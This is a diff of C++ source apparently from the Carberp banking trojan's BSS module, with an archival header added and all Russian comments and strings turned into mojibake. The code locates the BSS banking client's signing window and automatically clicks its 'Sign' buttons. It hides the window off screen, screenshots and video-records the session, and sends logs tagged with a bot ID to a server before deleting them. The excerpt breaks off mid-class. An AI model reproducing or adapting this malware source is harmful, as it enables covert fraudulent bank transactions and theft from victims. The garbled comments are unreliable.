@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 
 #include "bsssign.h"
@@ -26,40 +37,40 @@ namespace bsssign_Template
 
 
 //-------------------------------------------------
-//  Объявление имени включит логирование действий
-//  при установке пописи
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //-------------------------------------------------
 #define LOG_BSS_SIGN
 
 
 //----------------------------------------------------------------------------
 
-// Определяем переменную включающую опцию прятания окна
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 #if !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
 	#define BSSSIGN_HIDE_WND
 #endif
 
 
-// Хэш имени класса формы подписывания
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #define BSS_FORM_CLASS_HASH 0xF8047238 /* obj_Form */
 
-// Хэш имени класса окна
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 #define BSS_BUTTON_CLASS_HASH 0xB84059EC /* obj_BUTTON */
 
-// Хэш заголовка установки подписи
-#define BSS_SIGN_FORM_CAPTION_HASH 0x4DFAF875 /* Подпись */
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define BSS_SIGN_FORM_CAPTION_HASH 0x4DFAF875 /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 
-// Заголовок кнопки подписи
-#define BSS_SIGN_BUTTON_CAPTION_HASH 0xBE1A55FD /* Подписать */
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define BSS_SIGN_BUTTON_CAPTION_HASH 0xBE1A55FD /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 
-// Заголовко кнопки закрытия
-#define BSS_CLOSE_BUTTON_CAPTION_HASH 0xAE1E1985 /* Закрыть */
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define BSS_CLOSE_BUTTON_CAPTION_HASH 0xAE1E1985 /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 
 
 
 
 //***********************************************************************
-//  Внутренние методы BSSSign
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BSSSign
 //***********************************************************************
 namespace BSSSign
 {
@@ -77,20 +88,20 @@ namespace BSSSign
 
 	class TBSSSignLog;
 
-	//  Класс логирования действий при подписи бсс
+	//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	TBSSSignLog *Logger = NULL;
 
 
 
 	DWORD WINAPI BSSSignSendLog(LPVOID aPath)
 	{
-		// Функция отправляет лог
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		string *Path = (string*)aPath;
 
-		//Отправляем логи
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		VideoProcess::SendFiles( 0, "bss", Path->t_str() );
 
-		// Удаляем файлы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		DeleteFolders(Path->t_str());
 
 
@@ -102,7 +113,7 @@ namespace BSSSign
 	class TBSSSignLog : public TBotObject
 	{
 	private:
-		// Поток записи лога
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		string FWorkPath;
 		TBotFileStream *FStream;
 		int FScreensCount;
@@ -123,7 +134,7 @@ namespace BSSSign
 
 		void MakeFullScreenShot()
 		{
-			// Функция делает снимок всего экрана
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			LPBYTE Buf = NULL;
 			DWORD Size = 0;
 			ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, Buf, Size);
@@ -134,18 +145,18 @@ namespace BSSSign
 
 		void MakeWndScreenShot(HWND Wnd)
 		{
-			// Функция делает снимок всего экрана
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //			LPBYTE Buf = NULL;
 //			DWORD Size = 0;
 //			ScreenShot::DrawWindow(Wnd, Buf, Size);
 //            AddScreen(Buf, Size);
 //			MemFree(Buf);
 
-			// На данном этапе делаем тектовый "снимок"
+			// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅпїЅ"
 //			PCHAR S = GetAllWindowsText(Wnd, true, true);
 //			if (S)
 //			{
-//				Write(NULL, false, "\r\n\r\nТекстовый снимок: \r\n");
+//				Write(NULL, false, "\r\n\r\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: \r\n");
 //				Write(NULL, false, S);
 //				Write(NULL, false, "\r\n");
 //
@@ -159,7 +170,7 @@ namespace BSSSign
 
 		TBSSSignLog()
 		{
-			// Создаём файл лога
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			FScreensCount = 0;
 
             TMemory Buf(MAX_PATH);
@@ -174,7 +185,7 @@ namespace BSSSign
 			string FileName = FWorkPath + "bss.log";
 			FStream = new TBotFileStream(FileName.t_str(), fcmCreate);
 
-			// Записываем уид
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			string Line = "UID: ";
 			Line += GenerateBotID2();
 
@@ -184,14 +195,14 @@ namespace BSSSign
 
 		~TBSSSignLog()
 		{
-			//  При уничтожении объекта закрываем лог
+			//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
         	Close();
 		}
 
 		//----------------------------------------------------------------
 		void Write(HWND ScreenWnd, bool MakeFullScreen, const char *Line)
 		{
-			// Функция записывает строку в лог
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 			if (!FStream) return;
 
 			FStream->WriteString(Line);
@@ -207,12 +218,12 @@ namespace BSSSign
 
 		void AddTextFile(const char* LogLine, const char* Data, DWORD DataLen)
 		{
-			// Функция добавляет в лог текстовый файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if (!DataLen)
 				DataLen = STRA::Length(Data);
 			if (!DataLen) return;
 
-			// Содаём имя файла
+			// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			FScreensCount++;
 			string Name;
 			Name.Format("TextLog%d.txt", FScreensCount);
@@ -232,7 +243,7 @@ namespace BSSSign
 				delete FStream;
 				FStream = NULL;
 
-				// Отправляем лог на сервер
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				StartThread(BSSSignSendLog, new string(FWorkPath));
             }
         }
@@ -242,7 +253,7 @@ namespace BSSSign
 //=============================================================================
 
 
-// Шаблон записи лога
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 template <class SCREENWND, class MAKEFULLSCREEN, class MESSAGE>
 inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, MESSAGE Message)
@@ -297,7 +308,7 @@ HWND BSSSearchButtons(HWND Form, bool OneButton, DWORD BtnCaptionHash, TBotList*
 
 		DWORD Hash = GetWndText2(Button).Hash();
 
-		// Проверяем заголовок кнопки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Hash != BtnCaptionHash)
 		{
 			Result = BSSSearchButtons(Button, OneButton, BtnCaptionHash, Buttons);
@@ -320,17 +331,17 @@ HWND BSSSearchButtons(HWND Form, bool OneButton, DWORD BtnCaptionHash, TBotList*
 
 bool BSSClickToButton(HWND Button)
 {
-	// Функция кликает по указанному окну
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	DWORD X = Random::Generate(2, 30);
 	DWORD Y = Random::Generate(2, 10);
 
-	BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, GetWndText2(Button).t_str());
-	BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+	BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ [%d][%s]", Button, GetWndText2(Button).t_str());
+	BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d, %d", X, Y);
 
 	bool Result = HardClickToWindow(Button, X, Y);
 	if (Result)
 	{
-		BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
+		BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: [%s] \r\n\r\n", GetWndText2(Button).t_str());
 
 		pSleep(Random::Generate(1000, 1500));
 	}
@@ -341,7 +352,7 @@ bool BSSClickToButton(HWND Button)
 
 DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 {
-	// Перебираем дочерние окна определённого класса и заголовка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Count = 0;
 	HWND Button = NULL;
 	do
@@ -354,7 +365,7 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 		string Text = GetWndText2(Button);
 		DWORD Hash = Text.Hash();
 
-		// Проверяем заголовок кнопки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Hash != BtnCaptionHash)
 		{
 			Count += BSSClickToButtons(Button, MultiClick, BtnCaptionHash);
@@ -363,16 +374,16 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 			continue;
 		}
 
-		// Кликаем по кнопке
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD X = Random::Generate(2, 30);
 		DWORD Y = Random::Generate(2, 10);
 
-		BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
-		BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+		BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ [%d][%s]", Button, Text.t_str());
+		BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d, %d", X, Y);
 
 		if (HardClickToWindow(Button, X, Y))
 		{
-			BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
+			BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: [%s] \r\n\r\n", GetWndText2(Button).t_str());
 
 			Count++;
 			pSleep(Random::Generate(1000, 1500));
@@ -395,7 +406,7 @@ class TBSSClicker;
 
 
 //***********************************************
-//  TBSSForm - Окно системы BSS
+//  TBSSForm - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS
 //***********************************************
 class TBSSForm : public TBotCollectionItem
 {
@@ -405,7 +416,7 @@ protected:
 	DWORD FClickTime;
 	DWORD FMaxWaitInterval;
 
-	// Функция перемещает окно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	void Move(int x, int y)
 	{
 		RECT R;
@@ -416,7 +427,7 @@ protected:
 		pMoveWindow(FForm, x, y, W, H, FALSE);
 	}
 
-	// Кликаем по необходимым кнопкам формы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool virtual Click()
 	{
 		FClickTime = (DWORD)pGetTickCount();
@@ -424,7 +435,7 @@ protected:
 		return true;
 	}
 
-	// Функция проверяет видимость окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	void virtual Wait()
 	{
 		DWORD Interval = (DWORD)pGetTickCount() - FClickTime;
@@ -433,23 +444,23 @@ protected:
     }
 
 public:
-	// Конструктор
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TBSSForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBotCollectionItem((TBotCollection*)aOwner)
 	{
 		FForm = Wnd;
 		FStatus = bfsUnknown;
-		FMaxWaitInterval = 10000; // Максимум 10 секунд ожидания закрытия
+		FMaxWaitInterval = 10000; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 10 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
     //------------------------------------------------------------------------
 
-	// Выполнить действия с окном
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	TBSSFormStatus virtual Execute()
 	{
 		switch (FStatus) {
-			case bfsUnknown: Click(); break;            // Кликаем по кнопкам
-			case bfsClicked: FStatus = bfsWait; break;  // Переходим в режим ожидания
-			case bfsWait:    Wait(); break;             // Ожидаем закрытия окна
+			case bfsUnknown: Click(); break;            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			case bfsClicked: FStatus = bfsWait; break;  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			case bfsWait:    Wait(); break;             // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		}
 
 		return FStatus;
@@ -458,13 +469,13 @@ public:
 
 	bool IsValid()
 	{
-		// Функция возвращает истину если окно валидно и отображается
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		return (BOOL)pIsWindow(FForm) != FALSE;
     }
 };
 
 //***********************************************
-// Окно установки подписей
+// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //***********************************************
 class TBSSSignForm : public TBSSForm
 {
@@ -476,17 +487,17 @@ protected:
 	TBotList FButtons;
 	DWORD    FClosebtnClickStart;
 
-	// Кликаем по кнопкам установки подписи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Click()
 	{
 //		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
 		if (FWaitWindow)
 		{
-			// Объект находится в режиме ожидания закрытия окна
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			FWaitWindow = Owner()->Count() > FWindowsCount;
 			if (FWaitWindow) return false;
         }
-		// Сохраняем количество открытых окон
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		FWindowsCount = Owner()->Count();
 
 		while (FButtons.Count())
@@ -500,8 +511,8 @@ protected:
 
 				if (Owner()->Count() > FWindowsCount)
 				{
-					// после нажатия на кнопку было отображено
-					// ещё одно окно, переходим в режим ожидания закрытия
+					// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+					// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					FWaitWindow = true;
 					return false;
                 }
@@ -510,16 +521,16 @@ protected:
 
 
 
-		BDBG("bsssign","Подпись завершена. Нажато кнопок %d", FClickedCount);
+		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %d", FClickedCount);
 
 		TBSSForm::Click();
 
 
         /* TODO :
-			Запускаем бесконечную запись видео.
-			Данная запись должна запускаться только в случае успешной подписи
-			Проблема в том, что из бота определить, что полпись успешно
-			поставлена
+			пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+			пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		*/
         if (FClickedCount)
 			VideoProcess::RecordPID( 0, "BSS" );
@@ -529,7 +540,7 @@ protected:
         return FClickedCount > 0;
     }
 
-	// Функция проверяет статус окна установки подписей
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	void Wait()
 	{
 		if (Owner()->Count() > 1)
@@ -541,14 +552,14 @@ public:
 	TBSSSignForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBSSForm(aOwner, Wnd)
 	{
-		// Определяем списко кнопок по которым необходимо кликнуть
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		FClickedCount = 0;
 		FWaitWindow   = false;
 		FClosebtnClickStart = 0;
         BSSSearchButtons(Wnd, false, BSS_SIGN_BUTTON_CAPTION_HASH, &FButtons);
 
-		BDBG("bsssign","Перехвачено окно установки подписей. Подписей %d", FButtons.Count());
-		BSSSIGNLOG(Wnd, false, "Обрабатываем окно установки подписей. Подписей %d", FButtons.Count());
+		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d", FButtons.Count());
+		BSSSIGNLOG(Wnd, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d", FButtons.Count());
 		#ifdef BSSSIGN_HIDE_WND
             Move(-1000, 0);
 		#endif
@@ -557,8 +568,8 @@ public:
 
 	TBSSFormStatus Execute()
 	{
-		// В случае если окно подписи одно на экране и на
-		// нём не нажималась кнопка закрыть кликаем по ней
+		// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ
+		// пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ
 		if (FStatus == bfsWait && !FCloseBtnClicked)
 		{
 
@@ -569,9 +580,9 @@ public:
 					FClosebtnClickStart = (DWORD)pGetTickCount();
 				bool SendCloseMsg = ((DWORD)pGetTickCount() - FClosebtnClickStart) > 5000;
 
-				// Будем кликать по кнопке закрытия до коликов в ж....
-				// Если колики наступили а коно ещё открыто то отправляем
-				// ему сообщение WM_CLOSE
+				// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ....
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WM_CLOSE
 
 				if (SendCloseMsg)
 				{
@@ -579,7 +590,7 @@ public:
 				}
 				else
 				{
-					BSSSIGNLOG(FForm, false, "Кликаем по кнопке закрытия");
+					BSSSIGNLOG(FForm, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 					BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
 				}
 			}
@@ -590,7 +601,7 @@ public:
 		return TBSSForm::Execute();
     }
 
-	// Функция вернёт истину если окно является окном установки подписи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool static IsSignForm(DWORD ClassHash, DWORD TextHash)
 	{
 		return ClassHash == BSS_FORM_CLASS_HASH &&
@@ -599,7 +610,7 @@ public:
 };
 
 //***********************************************
-//Кдасс ожидания ввода пароля
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //***********************************************
 class TBSSPasswordForm : public TBSSForm
 {
@@ -607,33 +618,33 @@ public:
